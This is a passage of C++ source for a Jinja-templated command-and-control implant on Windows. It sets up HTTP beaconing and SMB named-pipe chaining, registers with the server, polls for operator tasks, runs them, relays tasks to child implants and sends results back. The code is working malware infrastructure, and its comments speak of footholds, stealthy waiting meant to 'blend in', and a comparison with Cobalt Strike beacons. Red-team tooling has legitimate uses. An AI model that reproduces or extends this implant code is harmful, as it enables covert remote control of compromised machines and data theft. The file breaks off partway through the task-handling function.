void C2Implant::init() {
	/*
	This class should probably be in the contructor.

	Anyways, bad desgin aside, this initalizees all the needed components of the
	C2 class. This HAS to get called  first, or everything will break.

	Things such as the following are setup here:

	- Initial INGRESS strat
	- Initial EGRESS strat
	- Loading of available INGRESS/EGRESS strats (for operator selection)

	- Initing of the h_data_ready_event synchronization event, which tells us when we've got
		some data ready for us.
	*/

    /* template me - append listener names here */
    //declare list of valid get & post strats, for strat commands & strat lookups


    //Load GET Comms values in (templated)
    std::vector<std::string> available_ingress = {};

    [%- for c2_get_profile in get_function_mappings.values() %]
    
    available_ingress.push_back("[[ c2_get_profile.value ]]");
    
    [%- endfor %]


    //Load POST Comms values in (templated)
    std::vector<std::string> available_egress = {};

    [%- for c2_post_profile in post_function_mappings.values() %]
    
    available_egress.push_back("[[ c2_post_profile.value ]]");
    
    [%- endfor %]


    /* endtemplate */

    //update settings with this list
    SettingsManager::instance().set<std::vector<std::string>>("comms_get_strats", available_ingress);
    SettingsManager::instance().set<std::vector<std::string>>("comms_post_strats", available_egress);

    // Set Defaults (templated)
    SettingsManager::instance().set("comms_get_function", "[[ init_get_function ]]");
    SettingsManager::instance().set("comms_post_function", "[[ init_post_function ]]");

    // Initialize the synchronization event
    if (h_data_ready_event == NULL) {
        h_data_ready_event = CreateEventW(NULL, FALSE, FALSE, NULL);
    }

    // Build the transports for the first time, so the pointers exist
    this->update_transports();

	//annnnd regester implant
	std::string implant_uuid = uuid7::generate();
	//send our first what's up message, there should be no tasks available for us yet,
	//cuz according to the server, before this call, we don't exist.
	nlohmann::json data = current_ingress_->get(implant_uuid);

	SettingsManager::instance().set("registered", 1);
	implant_uuid_ = implant_uuid;

}

void C2Implant::update_transports() {
	/*
	==========================================================================================
	TRANSPORT STATE MANAGER (update_transports)
	==========================================================================================
	Dynamically initializes and updates the active Ingress and Egress transport pointers
	(current_ingress_ and current_egress_) based on the current SettingsManager configuration.

	ARCHITECTURAL DESIGN & JUSTIFICATION:
	1. State Retention: By persisting these class instances (rather than using a factory
	   pattern to recreate them every cycle), we can easily maintain active network sockets,
	   named pipe handles, and session tokens.
	2. Clean Memory: This entirely avoids the messy anti-pattern of storing live OS handles
	   or complex states inside the global settings dictionary.
	3. Safe Teardown: Automatically handles the destruction of old transport objects before
	   allocating new ones to prevent memory and handle leaks.

	BIG NOTE:
	This function MUST be called explicitly anytime the 'comms_get_function' or
	'comms_post_function' strategies are changed. Otherwise, the implant will continue
	routing data through the old, (potentially) disconnected transport pointers.

	This is currently managed in cycle, via a previous vs current strat check. 
	==========================================================================================
	*/

    //Get the name of our current strategies as defined by settings. 
	//remember, this jsut holds a string that is the strat name. 
	//the class instance IS NOT held here, that logic is done below
    std::string get_strat = SettingsManager::instance().get<std::string>("comms_get_function", "");
    std::string post_strat = SettingsManager::instance().get<std::string>("comms_post_function", "");

	// Sanity check: If an old transport object exists, nuke it to prevent memory leaks 
	// before we allocate a new one.
    if (current_ingress_ != nullptr) {
        delete current_ingress_;
        current_ingress_ = nullptr;
    }

    //then, find our strats, and set them accordingly
	/* TEMPLATE MEEEE [this block was generated by a jinja template]*/

    [%- for c2_get_profile in get_function_mappings.values() %]
    
    if (get_strat.find("[[ c2_get_profile.value ]]") != std::string::npos) {
        /*
		========================================================================
		HTTP / POLL-BASED EGRESS (Standard Beaconing)
		========================================================================
		If the active strategy is a standard network protocol (like HTTP),
		initialization is completely stateless and straightforward.

		Unlike Named Pipes/handle based methods, we do not need to manage persistent OS handles,
		worry about dead P2P links, or block waiting for a connection.

		We simply instantiate the transport class. The actual socket creation,
		HTTP transaction, and teardown will happen entirely on-the-fly inside
		the class whenever current_egress_->send_response() is called.
		========================================================================
		*/
        current_ingress_ = new [[ c2_get_profile.value ]]_class();
    }

    [%- endfor %]
    
    /* END TEMPLATE MEEEE */
	
    	else if (get_strat.find("pipe") != std::string::npos) {
		/*
		========================================================================
		SMB / NAMED PIPE INGRESS (P2P Child)
		========================================================================
		If the active strategy is SMB (pipes), we ensure a clean connection state:

		1. NORMAL STATE:
			If the inbox handle is already valid, just hook up the PipeIngress class.
			(i.e., then we can do current_ingress -> fetch()... etc

		2. FIRST RUN / CONTINGENCY:
			If the inbox handle is invalid (first boot, strat change, or broken pipe):
				A. Nuke any lingering handles (e.g., a surviving outbox) to prevent
				"ERROR_PIPE_BUSY" or half-dead connection states.
				B. Call register_pipe() to spin up both pipes from scratch and wait
				for the parent to connect.
				C. Hook up the newly registered inbox handle.
		========================================================================
		*/
		//if (h_inbox_ != INVALID_HANDLE_VALUE) {
		//	current_ingress_ = new PipeIngress(h_inbox_);
		//	std::cout << "[*] INGRESS == pipe!" << std::endl;
		//}
		if (h_inbox_ != INVALID_HANDLE_VALUE && h_outbox_ != INVALID_HANDLE_VALUE) {
			// Pass both so Ingress can Write -> Read
			current_ingress_ = new PipeIngress(h_inbox_, h_outbox_);
			std::cout << "[*] INGRESS == pipe!" << std::endl;
		}

		else {
			std::cout << "[!] handle of GET pipe ==  INVALID_HANDLE_VALUE" << std::endl;
			//check if pipes are registered, if not, check previous handles (close if they are open)
			// and then register both pipes            
			//Only check opposite handle, as the prior if
			//checked h_inbox_ != invalid handle
			if (h_outbox_ != INVALID_HANDLE_VALUE) {
				CloseHandle(h_outbox_);
				h_outbox_ = INVALID_HANDLE_VALUE;
			}

			if (SMB::Child::register_pipe(h_inbox_, h_outbox_) != 0) {
				std::cerr << "Failed to register pipes." << std::endl;
				return;
			}
			//set current ingress to pipe
			current_ingress_ = new PipeIngress(h_inbox_, h_outbox_);
			std::cout << "[*] INGRESS == pipe!" << std::endl;
		}

	}

	/* END TEMPLATE MEEEE  [this block was generated by a jinja template]*/


    // --- EGRESS ---
	// Sanity check: If an old transport object exists, nuke it to prevent memory leaks 
	// before we allocate a new one.
    if (current_egress_ != nullptr) {
        delete current_egress_;
        current_egress_ = nullptr;
    }

    //then, find our strats, and set them accordingly
	/* TEMPLATE MEEEE  [this block was generated by a jinja template]*/

    [%- for c2_post_profile in post_function_mappings.values() %]
    
    if (post_strat.find("[[ c2_post_profile.value ]]") != std::string::npos) {
        /*
		========================================================================
		HTTP / POLL-BASED EGRESS (Standard Beaconing)
		========================================================================
		If the active strategy is a standard network protocol (like HTTP),
		initialization is completely stateless and straightforward.

		Unlike Named Pipes/handle based methods, we do not need to manage persistent OS handles,
		worry about dead P2P links, or block waiting for a connection.

		We simply instantiate the transport class. The actual socket creation,
		HTTP transaction, and teardown will happen entirely on-the-fly inside
		the class whenever current_egress_->send_response() is called.
		========================================================================
		*/
        current_egress_ = new [[ c2_post_profile.value ]]_class();
    }

    [%- endfor %]

	else if (post_strat.find("pipe") != std::string::npos) {
		/*
		========================================================================
		SMB / NAMED PIPE INGRESS (P2P Child)
		========================================================================
		If the active strategy is SMB (pipes), we ensure a clean connection state:

		1. NORMAL STATE:
			If the inbox handle is already valid, just hook up the PipeIngress class.
			(i.e., then we can do current_egress -> send_response()... etc

		2. FIRST RUN / CONTINGENCY:
			If the inbox handle is invalid (first boot, strat change, or broken pipe):
				A. Nuke any lingering handles (e.g., a surviving outbox) to prevent
				"ERROR_PIPE_BUSY" or half-dead connection states.
				B. Call register_pipe() to spin up both pipes from scratch and wait
				for the parent to connect.
				C. Hook up the newly registered inbox handle.
		========================================================================
		*/
		if (h_outbox_ != INVALID_HANDLE_VALUE) {
			current_egress_ = new PipeEgress(h_outbox_);
			std::cout << "[*] EGRESS == pipe!" << std::endl;

		}
		else {
			std::cout << "[!] handle of POST pipe ==  INVALID_HANDLE_VALUE" << std::endl;
			//check if pipes are registered, if not, check previous handles (close if they are open)
			// and then register both pipes.
			//Only check opposite handle, as the prior if
			//checked h_outbox_ != invalid handle
			if (h_inbox_ != INVALID_HANDLE_VALUE) {
				CloseHandle(h_inbox_);
				h_inbox_ = INVALID_HANDLE_VALUE;
			}

			if (SMB::Child::register_pipe(h_inbox_, h_outbox_) != 0) {
				std::cerr << "Failed to register pipes." << std::endl;
				return;
			}
			//set current ingress to pipe
			current_egress_ = new PipeEgress(h_outbox_);
			std::cout << "[*] EGRESS == pipe!" << std::endl;
		}


	}
	/* END TEMPLATE MEEEE [this block was generated by a jinja template]*/


}

void C2Implant::cycle() {
	//var for previous strat & tracking changes
	std::string active_ingress_strat_name = SettingsManager::instance().get<std::string>("comms_get_function", "");
	std::string active_egress_strat_name = SettingsManager::instance().get<std::string>("comms_post_function", "");

	while (true) {

		std::cout << "[*] Start of cycle" << std::endl;

		//a quick check, to update the strats, if/when the operator switches strat
		std::string desired_ingress = SettingsManager::instance().get<std::string>("comms_get_function", "");
		std::string desired_egress = SettingsManager::instance().get<std::string>("comms_post_function", "");

		if (active_ingress_strat_name != desired_ingress || active_egress_strat_name != desired_egress) {
			std::cout << "[*] Strategy change detected! Rebuilding transports..." << std::endl;
			this->update_transports();

			// Sync our local tracking variables
			active_ingress_strat_name = desired_ingress;
			active_egress_strat_name = desired_egress;
		}

		//current ingress/egress are class vars
		//lets make sure these exist, otherwise, sleep
		if (!current_ingress_ || !current_egress_) {
			this->sleep_implant();
			continue;
		}

		/*
		Get the wait handle

		This is either:

		NULL:
			> poll based comms method

		or an actual handle.

		This is used to decide how we wait for the object, and is the psuedo sleep.

		*/
		HANDLE h_in_event = current_ingress_->get_wait_handle();
		DWORD timeout = (h_in_event != NULL) ? INFINITE : (SettingsManager::instance().get<int>("sleep_time", 5) * 1000);

		DWORD result;

		if (h_in_event != NULL) {
			// --- PIPE MODE ---
			// Wait for either the Pipe (Index 0) or the Worker (Index 1)
			HANDLE handles[2] = { h_in_event, h_data_ready_event };
			result = WaitForMultipleObjects(2, handles, FALSE, timeout);
		}
		else {
			// --- HTTP/non handle based comms MODE ---
			// We ONLY wait for the Worker. The "Fetch" happens via the timeout.
			//if no task, this is effectively the sleep. 
			result = WaitForSingleObject(h_data_ready_event, timeout);
		}

		// --- Event Handling/Dispatcher ---
		/*
		   This block functions as a state machine that handles the transition
		   between Ingress and Egress communication methods

		   The dispatcher accounts for the fundamental difference between:
		   1. POLL-based (Implant-initiated 'Pull')
			> i.e. HTTP
		   2. HANDLE-based (Kernel-signaled 'Push')
			> i.e., Named Pipes

			This adds a bit of complexity to the implant, but also allows
			for protocol switching, and use of handle based methods, like named pipes,
			on every implant.
		*/

		// ================================================================================
		// TRIGGER 1: POLL-BASED INGRESS (Wait Timeout)
		// For transports without a kernel handle (HTTP/DNS), the "GET" is triggered 
		// by the expiration of the sleep/jitter timer (via WaitForSingleObject)
		// It's quieter than a Sleep call, and WaitForSingleObject without INFINITE 
		// should hopefully blend in. 
		// ================================================================================
		//if (result == WAIT_TIMEOUT) {
		//    // This ONLY triggers when the 5 seconds pass without a worker finishing.
		//    // It ensures we consistently "GET" even if we haven't just "POSTed" something.
		//    nlohmann::json task = ingress->fetch_task(implant_uuid_);
		//    if (!task.is_null() && task.contains("task_uuid")) {
		//        dispatch_to_threadpool(task);
		//    }
		//}
		if (result == WAIT_TIMEOUT) {
			std::cout << "[*] Poll Based Ingress" << std::endl;

			nlohmann::json incoming = current_ingress_->get(implant_uuid_);

			handle_tasks(incoming);

		}
		// ================================================================================
		// TRIGGER 2: HANDLE-BASED INGRESS (Kernel Signal)
		// For transports with a kernel handle (Pipes/Sockets), the Windows Kernel 
		// signals this thread as soon as data arrives, bypassing the need for a timer/polling.
		// ex, parent implant writes task to our SMB inbox pipe
		// ================================================================================
		/*
		Quick note - smb/handle beacons act whenever they get data. It's my understanding
		this is "fine", as:
		1. you already have a foothold and data is (presumably) not leaving the network
			> unless someone is fucking crazy, has SMB open on their external FW, you
			  run an implant on your own host, and point that implant at the SMB child Implant
			  through that FW.

		2. It adds a lot of delay with chained beacons, if every single one has it's own sleep
		timer to wait for.

		It also appears (from playing with Cobalt Beacons) that they operate in "realtime" over
		SMB anyways, so if they can do it so can we?

		Who knows. Just something to be aware of.

		TLDR: SMB/handle comms via Implant have  no set sleep time. When it gets data, it acts, as fast or as slow as that is.
		*/
		else if (h_in_event != NULL && result == WAIT_OBJECT_0) {
			std::cout << "[*] Handle Based Ingress" << std::endl;
			nlohmann::json incoming = current_ingress_->get(implant_uuid_);

			handle_tasks(incoming);
		}

		// ================================================================================
		// TRIGGER 3: WORKER COMPLETION (Internal Signal)
		// Regardless of the ingress method, this triggers when a background worker 
		// finishes a command and places the result in the response_queue. This is our 
		// (literal) signal to send back our data. 
		// ================================================================================
		else if (result == WAIT_OBJECT_0 || (h_in_event != NULL && result == WAIT_OBJECT_0 + 1)) {
			std::cout << "[*] Worker completed, queueing task response" << std::endl;

			std::lock_guard<std::mutex> lock(PostQueue::mutex);
			if (!PostQueue::post_queue.empty()) {
				//lol why the double if
				// Drain the queue and pack it into a single json array
				if (!PostQueue::post_queue.empty()) {
					nlohmann::json batched_json = create_batched_task_json(implant_uuid_, PostQueue::post_queue);

					// Then give the JSON to the egress method to do what it needs for network transport
					//currently, msgpack
					current_egress_->send_response(implant_uuid_, batched_json);

				} //lock goes out of scope here, and unlocks
			}
		}
	}
}

void C2Implant::sleep_implant() {
    int sleep_time = SettingsManager::instance().get<int>("sleep_time", 5);
    std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time * 1000));
}



//Helper to handle tasks 
void C2Implant::handle_tasks(const nlohmann::json& incoming) {
	//debug inbound
	std::cout << incoming.dump(4) << std::endl;

	// Handle HTTP 204/40X / Empty Pipes
	if (incoming.is_null()) {
		std::cout << "No tasks" << std::endl;
		return; // Nothing to do, go back to sleep/wait
	}


	// Handle task array
	if (incoming.is_array()) {
		std::cout << "Task List recieved" << std::endl;

		for (const auto& task : incoming) {
			// Safety check: Does it have the required routing data?
			if (!task.is_null() && task.contains("implant_uuid") && task.contains("task_uuid")) {

				// If it's our UUID, process it
				if (task["implant_uuid"] == this->implant_uuid_) {
					dispatch_to_threadpool(task);
				}
				// Otherwise, route it down the chain
				else {
					//this may be prone to failure, if this hangs, everything probably hangs
					std::cout << "[*] Routing task to child asynchronously..." << std::endl;
					dispatch_to_child_router(task, task["implant_uuid"]);
				}
			}
		}
	}


